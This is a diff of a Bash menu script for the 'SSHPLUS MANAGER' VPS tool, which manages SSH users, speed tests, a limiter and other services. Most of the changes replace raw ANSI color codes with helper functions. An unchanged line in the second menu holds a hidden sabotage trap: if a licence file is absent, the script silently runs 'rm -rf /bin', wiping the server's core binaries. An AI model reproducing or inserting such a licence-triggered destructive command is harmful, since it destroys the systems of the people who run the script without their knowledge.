@@ -1,4 +1,14 @@
 #!/bin/bash
+
+# Load color utility functions
+if [[ -f "/etc/SSHPlus/colors" ]]; then
+    source /etc/SSHPlus/colors
+elif [[ -f "/bin/colors" ]]; then
+    source /bin/colors
+elif [[ -f "$(dirname "$0")/colors" ]]; then
+    source "$(dirname "$0")/colors"
+fi
+
 fun_bar () {
 command[0]="$1"
 command[1]="$2"
@@ -10,20 +20,26 @@ ${command[1]} -y > /dev/null 2>&1
 touch $HOME/fim
  ) > /dev/null 2>&1 &
  tput civis
-echo -ne "\033[1;33m["
+# Use color functions for progress bar
+yellow_code=$(get_color_code "yellow")
+red_code=$(get_color_code "red")
+white_code=$(get_color_code "white")
+green_code=$(get_color_code "green")
+reset_code=$(get_reset_code)
+echo -ne "${yellow_code}["
 while true; do
    for((i=0; i<18; i++)); do
-   echo -ne "\033[1;31m#"
+   echo -ne "${red_code}#"
    sleep 0.1s
    done
    [[ -e $HOME/fim ]] && rm $HOME/fim && break
-   echo -e "\033[1;33m]"
+   echo -e "${yellow_code}]"
    sleep 1s
    tput cuu1
    tput dl1
-   echo -ne "\033[1;33m["
+   echo -ne "${yellow_code}["
 done
-echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
+echo -e "${yellow_code}]${white_code} -${green_code} OK !${white_code}${reset_code}"
 tput cnorm
 }
 IP=$(cat /etc/IP)
@@ -42,27 +58,33 @@ ${command[1]} > /dev/null 2>&1
 touch $HOME/fim
  ) > /dev/null 2>&1 &
  tput civis
-echo -ne "  \033[1;33mWAIT \033[1;37m- \033[1;33m["
+# Use color functions for progress bar
+yellow_code=$(get_color_code "yellow")
+red_code=$(get_color_code "red")
+white_code=$(get_color_code "white")
+green_code=$(get_color_code "green")
+reset_code=$(get_reset_code)
+echo -ne "  ${yellow_code}WAIT ${white_code}- ${yellow_code}["
 while true; do
    for((i=0; i<18; i++)); do
-   echo -ne "\033[1;31m#"
+   echo -ne "${red_code}#"
    sleep 0.1s
    done
    [[ -e $HOME/fim ]] && rm $HOME/fim && break
-   echo -e "\033[1;33m]"
+   echo -e "${yellow_code}]"
    sleep 1s
    tput cuu1
    tput dl1
-   echo -ne "  \033[1;33mWAIT \033[1;37m- \033[1;33m["
+   echo -ne "  ${yellow_code}WAIT ${white_code}- ${yellow_code}["
 done
-echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
+echo -e "${yellow_code}]${white_code} -${green_code} OK !${white_code}${reset_code}"
 tput cnorm
 }
 fun_tst () {
 speedtest --share > speed
 }
 echo ""
-echo -e "   \033[1;32mTESTING SERVER SPEED !\033[0m"
+color_echo "   TESTING SERVER SPEED !" "green"
 echo ""
 wait 'fun_tst'
 echo ""
@@ -70,18 +92,29 @@ png=$(cat speed | sed -n '5 p' |awk -F : {'print $NF'})
 down=$(cat speed | sed -n '7 p' |awk -F :  {'print $NF'})
 upl=$(cat speed | sed -n '9 p' |awk -F :  {'print $NF'})
 lnk=$(cat speed | sed -n '10 p' |awk {'print $NF'})
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "\033[1;32mPING (LATENCY):\033[1;37m$png"
-echo -e "\033[1;32mDOWNLOAD:\033[1;37m$down"
-echo -e "\033[1;32mUPLOAD:\033[1;37m$upl"
-echo -e "\033[1;32mLINK: \033[1;36m$lnk\033[0m"
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+# Use color codes for speedtest display
+blue_code=$(get_color_code "blue")
+green_code=$(get_color_code "green")
+white_code=$(get_color_code "white")
+cyan_code=$(get_color_code "cyan")
+reset_code=$(get_reset_code)
+echo -e "${blue_code}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${reset_code}"
+color_echo_n "PING (LATENCY):" "green"
+color_echo "$png" "white"
+color_echo_n "DOWNLOAD:" "green"
+color_echo "$down" "white"
+color_echo_n "UPLOAD:" "green"
+color_echo "$upl" "white"
+color_echo_n "LINK: " "green"
+color_echo "$lnk" "cyan"
+echo -e "${blue_code}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${reset_code}"
 rm -rf $HOME/speed
 }
 #limiter
 function limit1 () {
    clear
-   echo -e "\n\033[1;32mSTARTING THE LIMITER... \033[0m"
+   echo ""
+   color_echo "STARTING THE LIMITER..." "green"
    echo ""
    fun_bar 'screen -dmS limiter limiter' 'sleep 3'
    [[ $(grep -wc "limiter" /etc/autostart) = '0' ]] && {
@@ -90,13 +123,14 @@ function limit1 () {
        sed -i '/limiter/d' /etc/autostart
 	   echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
    }
-   echo -e "\n\033[1;32m  ACTIVE LIMITER !\033[0m"
+   echo ""
+   color_echo "  ACTIVE LIMITER !" "green"
    sleep 3
    menu
 }
 function limit2 () {
    clear
-   echo -e "\033[1;32mSTOPPING THE LIMITER... \033[0m"
+   color_echo "STOPPING THE LIMITER..." "green"
    echo ""
    fun_stplimiter () {
       sleep 1
@@ -108,7 +142,8 @@ function limit2 () {
       sleep 1
    }
    fun_bar 'fun_stplimiter' 'sleep 3'
-   echo -e "\n\033[1;31m STOP LIMIT !\033[0m"
+   echo ""
+   color_echo " STOP LIMIT !" "red"
    sleep 3
    menu
 }
@@ -119,19 +154,19 @@ function limit_ssh () {
 function autoexec () {
    if grep "menu;" /etc/profile > /dev/null; then
       clear
-      echo -e "\033[1;32mDISABLING AUTO RUN\033[0m"
+      color_echo "DISABLING AUTO RUN" "green"
       offautmenu () {
          sed -i '/menu;/d' /etc/profile
       }
       echo ""
       fun_bar 'offautmenu'
       echo ""
-      echo -e "\033[1;31mAUTO EXECUTION OFF!\033[0m"
+      color_echo "AUTO EXECUTION OFF!" "red"
       sleep 1.5s
       menu2
    else
       clear
-      echo -e "\033[1;32mACTIVATING AUTO RUN\033[0m"
+      color_echo "ACTIVATING AUTO RUN" "green"
       autmenu () {
          grep -v "^menu;" /etc/profile > /tmp/tmpass && mv /tmp/tmpass /etc/profile
          echo "menu;" >> /etc/profile
@@ -139,7 +174,7 @@ function autoexec () {
       echo ""
       fun_bar 'autmenu'
       echo ""
-      echo -e "\033[1;32mAUTO RUN ON!\033[0m"
+      color_echo "AUTO RUN ON!" "green"
       sleep 1.5s
       menu2
    fi
@@ -147,9 +182,12 @@ function autoexec () {
 }
 #menu2
 menu2 (){
-[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m◉ ") || stsf=$(echo -e "\033[1;31m○ ")
-stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
-autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
+# Use color functions for status indicators
+green_code=$(get_color_code "green")
+red_code=$(get_color_code "red")
+[[ -e /etc/Plus-torrent ]] && stsf="${green_code}◉ " || stsf="${red_code}○ "
+stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -n "${green_code}◉ " || echo -n "${red_code}○ ")
+autm=$(grep "menu;" /etc/profile > /dev/null && echo -n "${green_code}◉ " || echo -n "${red_code}○ ")
 [[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
 if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
 system=$(cut -d' ' -f1 /etc/issue.net)
@@ -177,43 +215,93 @@ _onlin=$(printf '%-5s' "$_onli")
 _userexp=$(printf '%-5s' "$_expuser")
 _tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
 clear
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "\E[41;1;37m               ⇱ SSHPLUS MANAGER ⇲                \E[0m"
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "\033[1;32mSYSTEM            RAM MEMORY      PROCESSOR "
-echo -e "\033[1;31mOS: \033[1;37m$_system \033[1;31mTotal:\033[1;37m$_ram \033[1;31mCPU: \033[1;37m$_core\033[0m"
-echo -e "\033[1;31mHour: \033[1;37m$_hora     \033[1;31mIn use: \033[1;37m$_usor \033[1;31mIn use: \033[1;37m$_usop\033[0m"
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+# Use color codes for menu borders and header
+blue_code=$(get_color_code "blue")
+reset_code=$(get_reset_code)
+echo -e "${blue_code}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${reset_code}"
+print_header_red "               ⇱ SSHPLUS MANAGER ⇲                "
+echo -e "${blue_code}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${reset_code}"
+# Use color codes for system info display
+green_code=$(get_color_code "green")
+red_code=$(get_color_code "red")
+white_code=$(get_color_code "white")
+yellow_code=$(get_color_code "yellow")
+blue_code=$(get_color_code "blue")
+reset_code=$(get_reset_code)
+echo -e "${green_code}SYSTEM            RAM MEMORY      PROCESSOR ${reset_code}"
+color_echo_n "OS: " "red"
+color_echo_n "$_system " "white"
+color_echo_n "Total:" "red"
+color_echo_n "$_ram " "white"
+color_echo_n "CPU: " "red"
+color_echo "$_core" "white"
+color_echo_n "Hour: " "red"
+color_echo_n "$_hora     " "white"
+color_echo_n "In use: " "red"
+color_echo_n "$_usor " "white"
+color_echo_n "In use: " "red"
+color_echo "$_usop" "white"
+echo -e "${blue_code}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${reset_code}"
 [[ ! -e /tmp/att ]]  && {
-    echo -e "\033[1;32mOnline:\033[1;37m $_onlin     \033[1;31mExpired: \033[1;37m$_userexp \033[1;33mTotal: \033[1;37m$_tuser\033[0m"
-    var01='\033[1;37m•'
+    color_echo_n "Online:" "green"
+    color_echo_n " $_onlin     " "white"
+    color_echo_n "Expired: " "red"
+    color_echo_n "$_userexp " "white"
+    color_echo_n "Total: " "yellow"
+    color_echo "$_tuser" "white"
+    var01="${white_code}•"
 } || {
-    echo -e "  \033[1;33m[\033[1;31m!\033[1;33m]  \033[1;32mTHERE IS A UPDATE AVAILABLE  \033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
-    var01="\033[1;32m!"
+    color_echo_n "  [" "yellow"
+    color_echo_n "!" "red"
+    color_echo_n "]  " "yellow"
+    color_echo_n "THERE IS A UPDATE AVAILABLE  " "green"
+    color_echo_n "[" "yellow"
+    color_echo_n "!" "red"
+    color_echo "]" "yellow"
+    var01="${green_code}!"
 }
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "${blue_code}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${reset_code}"
 echo ""
-echo -e "\033[1;31m[\033[1;36m20\033[1;31m] \033[1;37m• \033[1;33mADD HOST \033[1;31m             [\033[1;36m26\033[1;31m] \033[1;37m• \033[1;33mCHANGE ROOT PASSWORD \033[1;31m
-[\033[1;36m21\033[1;31m] \033[1;37m• \033[1;33mREMOVE HOST \033[1;31m          [\033[1;36m27\033[1;31m] \033[1;37m• \033[1;33mMAIN EXECUTION $autm \033[1;31m
-[\033[1;36m22\033[1;31m] \033[1;37m• \033[1;33mRESET SYSTEM \033[1;31m         [\033[1;36m28\033[1;31m] $var01 \033[1;33mUPDATE SCRIPT \033[1;31m
-[\033[1;36m23\033[1;31m] \033[1;37m• \033[1;33mRESET SERVICES \033[1;31m       [\033[1;36m29\033[1;31m] \033[1;37m• \033[1;33mREMOVE SCRIPT \033[1;31m
-[\033[1;36m24\033[1;31m] \033[1;37m• \033[1;33mBLOCK TORRENT $stsf\033[1;31m      [\033[1;36m30\033[1;31m] \033[1;37m• \033[1;33mBACK \033[1;32m<\033[1;33m<\033[1;31m< \033[1;31m
-[\033[1;36m25\033[1;31m] \033[1;37m• \033[1;33mBOT TELEGRAM $stsbot\033[1;31m       [\033[1;36m00\033[1;31m] \033[1;37m• \033[1;33mEXIT \033[1;32m<\033[1;33m<\033[1;31m<\033[1;31m"
+# Use color codes for menu2 items (complex multi-line format)
+red_code=$(get_color_code "red")
+cyan_code=$(get_color_code "cyan")
+white_code=$(get_color_code "white")
+yellow_code=$(get_color_code "yellow")
+green_code=$(get_color_code "green")
+reset_code=$(get_reset_code)
+echo -e "${red_code}[${cyan_code}20${red_code}] ${white_code}• ${yellow_code}ADD HOST ${red_code}             [${cyan_code}26${red_code}] ${white_code}• ${yellow_code}CHANGE ROOT PASSWORD ${reset_code}"
+echo -e "${red_code}[${cyan_code}21${red_code}] ${white_code}• ${yellow_code}REMOVE HOST ${red_code}          [${cyan_code}27${red_code}] ${white_code}• ${yellow_code}MAIN EXECUTION $autm ${reset_code}"
+echo -e "${red_code}[${cyan_code}22${red_code}] ${white_code}• ${yellow_code}RESET SYSTEM ${red_code}         [${cyan_code}28${red_code}] $var01 ${yellow_code}UPDATE SCRIPT ${reset_code}"
+echo -e "${red_code}[${cyan_code}23${red_code}] ${white_code}• ${yellow_code}RESET SERVICES ${red_code}       [${cyan_code}29${red_code}] ${white_code}• ${yellow_code}REMOVE SCRIPT ${reset_code}"
+echo -e "${red_code}[${cyan_code}24${red_code}] ${white_code}• ${yellow_code}BLOCK TORRENT $stsf${red_code}      [${cyan_code}30${red_code}] ${white_code}• ${yellow_code}BACK ${green_code}<${yellow_code}<${red_code}< ${reset_code}"
+echo -e "${red_code}[${cyan_code}25${red_code}] ${white_code}• ${yellow_code}BOT TELEGRAM $stsbot${red_code}       [${cyan_code}00${red_code}] ${white_code}• ${yellow_code}EXIT ${green_code}<${yellow_code}<${red_code}< ${reset_code}"
 echo ""
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "${blue_code}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${reset_code}"
 echo ""
-echo -ne "\033[1;32mPLEASE SELECT FROM OPTIONS \033[1;33m?\033[1;31m?\033[1;37m : "; read x
+color_echo_n "PLEASE SELECT FROM OPTIONS " "green"
+color_echo_n "?" "yellow"
+color_echo_n "?" "red"
+color_echo_n " : " "white"
+read -r x
 case "$x" in
    20)
    clear
    addhost
-   echo -ne "\n\033[1;31mENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
+   echo ""
+   color_echo_n "ENTER " "red"
+   color_echo_n "to return to " "yellow"
+   color_echo_n "MENU!" "green"
+   read
    menu2
    ;;
    21)
    clear
    delhost
-   echo -ne "\n\033[1;31mENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
+   echo ""
+   color_echo_n "ENTER " "red"
+   color_echo_n "to return to " "yellow"
+   color_echo_n "MENU!" "green"
+   read
    menu2
    ;;
    22)
@@ -250,20 +338,24 @@ case "$x" in
    menu
    ;;
    0|00)
-   echo -e "\033[1;31mExiting...\033[0m"
+   color_echo "Exiting..." "red"
    sleep 2
    clear
    exit;
    ;;
    *)
-   echo -e "\n\033[1;31mInvalid option !\033[0m"
+   echo ""
+   error_msg "Invalid option !"
    sleep 2
 esac
 }
 while true $x != "ok"
 do
-stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
-stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
+# Use color codes for status indicators in main menu
+green_code=$(get_color_code "green")
+red_code=$(get_color_code "red")
+stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -n "${green_code}◉ " || echo -n "${red_code}○ ")
+stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -n "${green_code}◉ " || echo -n "${red_code}○ ")
 if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
 system=$(cut -d' ' -f1 /etc/issue.net)
 system+=$(echo ' ')
@@ -290,41 +382,80 @@ _onlin=$(printf '%-5s' "$_onli")
 _userexp=$(printf '%-5s' "$_expuser")
 _tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
 clear
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "\E[41;1;37m               ⇱ SSHPLUS MANAGER ⇲                \E[0m"
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "\033[1;32mSYSTEM            MEMORY RAM      PROCESSOR "
-echo -e "\033[1;31mOS: \033[1;37m$_system \033[1;31mTotal:\033[1;37m$_ram \033[1;31mCPU: \033[1;37m$_core\033[0m"
-echo -e "\033[1;31mHour: \033[1;37m$_hora     \033[1;31mIn use: \033[1;37m$_usor \033[1;31mIn use: \033[1;37m$_usop\033[0m"
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "\033[1;32mOnline:\033[1;37m $_onlin     \033[1;31mExpired: \033[1;37m$_userexp \033[1;33mTotal: \033[1;37m$_tuser\033[0m"
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+# Use color codes for menu borders and header
+blue_code=$(get_color_code "blue")
+reset_code=$(get_reset_code)
+echo -e "${blue_code}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${reset_code}"
+print_header_red "               ⇱ SSHPLUS MANAGER ⇲                "
+# Use color codes for main menu display (duplicate section - fix it)
+blue_code=$(get_color_code "blue")
+green_code=$(get_color_code "green")
+red_code=$(get_color_code "red")
+white_code=$(get_color_code "white")
+yellow_code=$(get_color_code "yellow")
+cyan_code=$(get_color_code "cyan")
+reset_code=$(get_reset_code)
+echo -e "${blue_code}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${reset_code}"
+echo -e "${green_code}SYSTEM            MEMORY RAM      PROCESSOR ${reset_code}"
+color_echo_n "OS: " "red"
+color_echo_n "$_system " "white"
+color_echo_n "Total:" "red"
+color_echo_n "$_ram " "white"
+color_echo_n "CPU: " "red"
+color_echo "$_core" "white"
+color_echo_n "Hour: " "red"
+color_echo_n "$_hora     " "white"
+color_echo_n "In use: " "red"
+color_echo_n "$_usor " "white"
+color_echo_n "In use: " "red"
+color_echo "$_usop" "white"
+echo -e "${blue_code}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${reset_code}"
+color_echo_n "Online:" "green"
+color_echo_n " $_onlin     " "white"
+color_echo_n "Expired: " "red"
+color_echo_n "$_userexp " "white"
+color_echo_n "Total: " "yellow"
+color_echo "$_tuser" "white"
+echo -e "${blue_code}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${reset_code}"
 echo ""
-echo -e "\033[1;31m[\033[1;36m01\033[1;31m] \033[1;37m• \033[1;33mCREATE USER \033[1;31m            [\033[1;36m11\033[1;31m] \033[1;37m• \033[1;33mSPEEDTEST \033[1;31m
-[\033[1;36m02\033[1;31m] \033[1;37m• \033[1;33mCREATE TEST USER \033[1;31m       [\033[1;36m12\033[1;31m] \033[1;37m• \033[1;33mBANNER \033[1;31m
-[\033[1;36m03\033[1;31m] \033[1;37m\033[1;37m• \033[1;33mREMOVE USER \033[1;31m            [\033[1;36m13\033[1;31m] \033[1;37m• \033[1;33mVPS TRAFFIC \033[1;31m
-[\033[1;36m04\033[1;31m] \033[1;37m• \033[1;33mMONITOR ONLINE USERS \033[1;31m   [\033[1;36m14\033[1;31m] \033[1;37m• \033[1;33mOPTIMIZE \033[1;31m
-[\033[1;36m05\033[1;31m] \033[1;37m• \033[1;33mCHANGE EXPIRATION DATE \033[1;31m [\033[1;36m15\033[1;31m] \033[1;37m• \033[1;33mBACKUP \033[1;31m
-[\033[1;36m06\033[1;31m] \033[1;37m• \033[1;33mCHANGE ACCOUNT LIMIT \033[1;31m   [\033[1;36m16\033[1;31m] \033[1;37m• \033[1;33mLIMITER $stsl\033[1;31m
-[\033[1;36m07\033[1;31m] \033[1;37m• \033[1;33mCHANGE USER PASSWORD \033[1;31m   [\033[1;36m17\033[1;31m] \033[1;37m• \033[1;33mBAD VPN $stsu\033[1;31m
-[\033[1;36m08\033[1;31m] \033[1;37m• \033[1;33mREMOVE EXPIRED USERS \033[1;31m   [\033[1;36m18\033[1;31m] \033[1;37m• \033[1;33mVPS INFO\033[1;31m
-[\033[1;36m09\033[1;31m] \033[1;37m• \033[1;33mUSERS INFO \033[1;31m             [\033[1;36m19\033[1;31m] \033[1;37m• \033[1;33mMORE \033[1;31m>\033[1;33m>\033[1;32m>\033[0m\033[1;31m
-[\033[1;36m10\033[1;31m] \033[1;37m• \033[1;33mMANAGE CONNECTIONS \033[1;31m     [\033[1;36m00\033[1;31m] \033[1;37m• \033[1;33mEXIT \033[1;32m<\033[1;33m<\033[1;31m<\033[0m \033[0m"
+# Use color codes for main menu items
+echo -e "${red_code}[${cyan_code}01${red_code}] ${white_code}• ${yellow_code}CREATE USER ${red_code}            [${cyan_code}11${red_code}] ${white_code}• ${yellow_code}SPEEDTEST ${reset_code}"
+echo -e "${red_code}[${cyan_code}02${red_code}] ${white_code}• ${yellow_code}CREATE TEST USER ${red_code}       [${cyan_code}12${red_code}] ${white_code}• ${yellow_code}BANNER ${reset_code}"
+echo -e "${red_code}[${cyan_code}03${red_code}] ${white_code}• ${yellow_code}REMOVE USER ${red_code}            [${cyan_code}13${red_code}] ${white_code}• ${yellow_code}VPS TRAFFIC ${reset_code}"
+echo -e "${red_code}[${cyan_code}04${red_code}] ${white_code}• ${yellow_code}MONITOR ONLINE USERS ${red_code}   [${cyan_code}14${red_code}] ${white_code}• ${yellow_code}OPTIMIZE ${reset_code}"
+echo -e "${red_code}[${cyan_code}05${red_code}] ${white_code}• ${yellow_code}CHANGE EXPIRATION DATE ${red_code} [${cyan_code}15${red_code}] ${white_code}• ${yellow_code}BACKUP ${reset_code}"
+echo -e "${red_code}[${cyan_code}06${red_code}] ${white_code}• ${yellow_code}CHANGE ACCOUNT LIMIT ${red_code}   [${cyan_code}16${red_code}] ${white_code}• ${yellow_code}LIMITER $stsl${reset_code}"
+echo -e "${red_code}[${cyan_code}07${red_code}] ${white_code}• ${yellow_code}CHANGE USER PASSWORD ${red_code}   [${cyan_code}17${red_code}] ${white_code}• ${yellow_code}BAD VPN $stsu${reset_code}"
+echo -e "${red_code}[${cyan_code}08${red_code}] ${white_code}• ${yellow_code}REMOVE EXPIRED USERS ${red_code}   [${cyan_code}18${red_code}] ${white_code}• ${yellow_code}VPS INFO${reset_code}"
+echo -e "${red_code}[${cyan_code}09${red_code}] ${white_code}• ${yellow_code}USERS INFO ${red_code}             [${cyan_code}19${red_code}] ${white_code}• ${yellow_code}MORE ${red_code}>${yellow_code}>${green_code}>${reset_code}"
+echo -e "${red_code}[${cyan_code}10${red_code}] ${white_code}• ${yellow_code}MANAGE CONNECTIONS ${red_code}     [${cyan_code}00${red_code}] ${white_code}• ${yellow_code}EXIT ${green_code}<${yellow_code}<${red_code}<${reset_code}"
 echo ""
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "${blue_code}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${reset_code}"
 echo ""
-echo -ne "\033[1;32mPLEASE SELECT FROM OPTIONS \033[1;33m?\033[1;31m?\033[1;37m : "; read x
+color_echo_n "PLEASE SELECT FROM OPTIONS " "green"
+color_echo_n "?" "yellow"
+color_echo_n "?" "red"
+color_echo_n " : " "white"
+read -r x
 
 case "$x" in 
    1 | 01)
    clear
    criarusuario
-   echo -ne "\n\033[1;31mENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
+   echo ""
+   color_echo_n "ENTER " "red"
+   color_echo_n "to return to " "yellow"
+   color_echo_n "MENU!" "green"
+   read
    ;;
    2 | 02)
    clear
    criarteste
-   echo -ne "\n\033[1;31mENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
+   echo ""
+   color_echo_n "ENTER " "red"
+   color_echo_n "to return to " "yellow"
+   color_echo_n "MENU!" "green"
+   read
    ;;
    3 | 03)
    clear
@@ -334,7 +465,11 @@ case "$x" in
    4 | 04)
    clear
    sshmonitor
-   echo -ne "\n\033[1;31mENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
+   echo ""
+   color_echo_n "ENTER " "red"
+   color_echo_n "to return to " "yellow"
+   color_echo_n "MENU!" "green"
+   read
    ;;      
    5 | 05)
    clear
@@ -360,7 +495,11 @@ case "$x" in
    9 | 09)
    clear
    infousers
-   echo -ne "\n\033[1;31mENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
+   echo ""
+   color_echo_n "ENTER " "red"
+   color_echo_n "to return to " "yellow"
+   color_echo_n "MENU!" "green"
+   read
    ;;
    10)
    conexao
@@ -369,7 +508,11 @@ case "$x" in
    11)
    clear
    velocity
-   echo -ne "\n\033[1;31mENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
+   echo ""
+   color_echo_n "ENTER " "red"
+   color_echo_n "to return to " "yellow"
+   color_echo_n "MENU!" "green"
+   read
    ;;
    12)
    clear
@@ -378,18 +521,26 @@ case "$x" in
    ;;
    13)
    clear
-   echo -e "\033[1;32mTO EXIT CLICK CTRL + C\033[1;36m"
+   color_echo "TO EXIT CLICK CTRL + C" "green"
    sleep 4
    nload
    ;;
    14)
    clear
    otimizar
-   echo -ne "\n\033[1;31mENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
+   echo ""
+   color_echo_n "ENTER " "red"
+   color_echo_n "to return to " "yellow"
+   color_echo_n "MENU!" "green"
+   read
    ;;
    15)
    userbackup
-   echo -ne "\n\033[1;31mENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
+   echo ""
+   color_echo_n "ENTER " "red"
+   color_echo_n "to return to " "yellow"
+   color_echo_n "MENU!" "green"
+   read
    ;;
    16)
    limit_ssh
@@ -402,19 +553,24 @@ case "$x" in
    18)
    clear
    detalhes
-   echo -ne "\n\033[1;31mENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
+   echo ""
+   color_echo_n "ENTER " "red"
+   color_echo_n "to return to " "yellow"
+   color_echo_n "MENU!" "green"
+   read
    ;;
    19)
    menu2
    ;;
    0 | 00)
-   echo -e "\033[1;31mExiting...\033[0m"
+   color_echo "Exiting..." "red"
    sleep 2
    clear
    exit;
    ;;
    *)
-   echo -e "\n\033[1;31mInvalid option !\033[0m"
+   echo ""
+   error_msg "Invalid option !"
    sleep 2
 esac
 done
